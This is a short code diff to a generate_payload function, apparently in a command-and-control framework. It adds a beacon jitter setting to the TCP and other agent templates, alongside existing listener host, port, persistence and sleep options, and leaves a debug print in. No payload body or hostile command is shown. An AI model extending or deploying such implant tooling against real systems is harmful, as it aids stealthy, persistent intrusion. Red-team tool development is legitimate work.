@@ -418,10 +418,12 @@ def generate_payload():
 
     userAgent = data.get("userAgent", "")
     sleepTimer = data.get("sleepTimer", "")
+    jitterPercentage=data.get("jitterPercentage","")
+    print(jitterPercentage)
 
     # Choose the appropriate template function and prepare parameters
     if protocol == "tcp":
-        agent_code = tcp_agent_template(lhost=lhost, lport=lport, persistence=persistence,agent_id=agent_id)
+        agent_code = tcp_agent_template(lhost=lhost, lport=lport, persistence=persistence,agent_id=agent_id,sleepTimer=sleepTimer,jitterPercentage=jitterPercentage)
         # write into database about the agent
         # Prepare extra data for storage
         extra_data = {
@@ -462,7 +464,8 @@ def generate_payload():
                 persistence=persistence, 
                 userAgent=userAgent, 
                 sleepTimer=sleepTimer,
-                agent_id=agent_id
+                agent_id=agent_id,
+                jitterPercentage=jitterPercentage
             )
             # Prepare extra data for storage
             extra_data = {
@@ -506,7 +509,8 @@ def generate_payload():
             persistence=persistence, 
             userAgent=data['userAgent'], 
             sleepTimer=data['sleepTimer'],
-            agent_id=agent_id
+            agent_id=agent_id,
+            jitterPercentage=jitterPercentage
         )
         extra_data = {
                 "name": name,
